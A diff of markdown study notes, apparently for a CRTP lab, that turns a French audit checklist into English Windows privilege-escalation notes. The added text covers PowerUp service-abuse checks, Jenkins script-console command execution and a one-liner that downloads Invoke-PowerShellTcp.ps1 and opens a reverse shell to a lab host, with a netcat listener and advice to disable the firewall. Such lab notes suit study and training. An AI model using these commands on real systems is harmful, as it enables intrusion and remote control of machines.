@@ -1,86 +1,108 @@
-# Windows PrivEsc
+---
+title: "2 - Win Privesc"
+---
 
-Revue des configurations Windows susceptibles d'entraîner une élévation locale de privilèges.
 
-## Points de contrôle
+# Win Privesc - Local
 
-- Correctifs manquants.
-- Déploiement automatisé et AutoLogon.
-- AlwaysInstallElevated.
-- Services mal configurés.
-- DLL Hijacking.
-- NTLM Relaying.
+> The material of CRTP about Local Privesc is not great
 
-## Services et PowerUp
+**There are various ways of locally escalating privileges on Windows box**:
+```powershell
+– Missing patches
+– Automated deployment and AutoLogon passwords in clear text
+– AlwaysInstallElevated (Any user can run MSI as SYSTEM)
+– Misconfigured Services
+– DLL Hijacking and more
+– NTLM Relaying a.k.a. Won't Fix
+```
 
-Les trois vérifications ci-dessous proviennent du chapitre source et nécessitent PowerUp dans un laboratoire autorisé.
+**We can use below tools for complete coverage**:
 
-### Chemins de services non quotés
+[PowerSploit - Privesc Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
 
+[Privesc on GitHub](https://github.com/enjoiz/Privesc)
+
+[winPEAS in PEASS-ng](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
+
+
+## Services Issues using PowerUp
+
+**Get services with unquoted paths and a space in their name**:
 ```powershell
 Get-ServiceUnquoted -Verbose
 ```
 
-Identifie des chemins de service non entourés de guillemets.
-
-### Fichiers de services modifiables
-
+**Get services where the current user can write to its binary path or change arguments to the binary**:
 ```powershell
 Get-ModifiableServiceFile -Verbose
 ```
 
-Recense les fichiers de services modifiables par l'identité courante.
-
-### Configuration de services modifiable
-
+**Get the services whose configuration current user can modify**:
 ```powershell
 Get-ModifiableService -Verbose
 ```
 
-Identifie les services dont la configuration est modifiable.
-
-## Inventaire des administrateurs locaux
-
-```cmd
-net localgroup Administrators
-```
-
-Affiche les membres du groupe Administrators sur une installation anglophone.
-
-## Audit automatisé
-
-Le document présente PowerUp, Privesc et winPEAS comme outils complémentaires. Examiner leurs résultats et confirmer manuellement les configurations avant toute conclusion.
-
-### Audit avec PowerUp
-
+**Run all checks with automated tools** :
 ```powershell
+# PowerUp:
 Invoke-AllChecks
-```
 
-Exécute les vérifications de configuration de PowerUp. Charger le module au préalable et examiner les résultats dans le périmètre autorisé.
-
-### Audit avec Privesc
-
-```powershell
+# Privesc:
 Invoke-PrivEsc
-```
 
-Lance les vérifications du script Privesc après son chargement. Examiner le script et sa version avant utilisation.
-
-### Audit avec winPEAS
-
-```cmd
+# PEASS-ng:
 winPEASx64.exe
 ```
 
-Exécute le binaire d'audit Windows x64 depuis un emplacement accessible. Utiliser une version de confiance et protéger les résultats, qui peuvent contenir des données sensibles.
+## Feature Abuse
+```
+- If you have Admin access (default installation before 2.x), go to http://<jenkins_server>/script
+- In the script console, Groovy scripts could be executed.
+```
 
-## Jenkins
+```powershell
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = '
+[INSERT COMMAND]'.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println "out> $sout err> $serr"
+```
 
-Les notes illustrent le risque des droits d'administration ou de modification de tâches de build : les consoles et étapes de compilation peuvent exécuter du code dans le contexte du service. Vérifier les permissions et l'isolation des agents.
+If you don't have admin access but could add or edit build steps in the build configuration. Add a build step, add "Execute Windows Batch Command" and enter:
+```powershell
+powershell -c <command>
+```
 
-## Ressources
+> Again, you could download and execute scripts, run encoded scripts and more.
 
-- [PowerSploit - Privesc](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
-- [Privesc](https://github.com/enjoiz/Privesc)
-- [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
+
+**Learning Objective 5**:
+
+- Exploit a service and elevate privileges to local administrator.
+- Identify a machine in the domain where ur user has local administrative access.
+- Using privileges of a user on Jenkins get admin privileges on another server.
+
+
+**[easy to detect]**
+```powershell
+Invoke-ServiceAbuse -Name 'AbyssWebServer' -Username dcorp\studentx -Verbose
+net localgroup Administrators
+```
+
+**[easy to detect - noise]**
+```powershell
+Find-PSRemotingLocalAdminAccess
+```
+
+```powershell
+on Jenkins> powershell iex (iwr -UseBasicParsing http://172.16.100.1/Invoke-PowerShellTcp.ps1); power -Reverse -IPAddress 172.16.100.1 -Port 443
+on Attacker> host the file in a webserver - example: HFS - HTTP File Server 
+```
+
+disable firewall or add exception
+```powershell
+on Attacker> netcat-win32-1.12.exe -lvp 443
+```
+
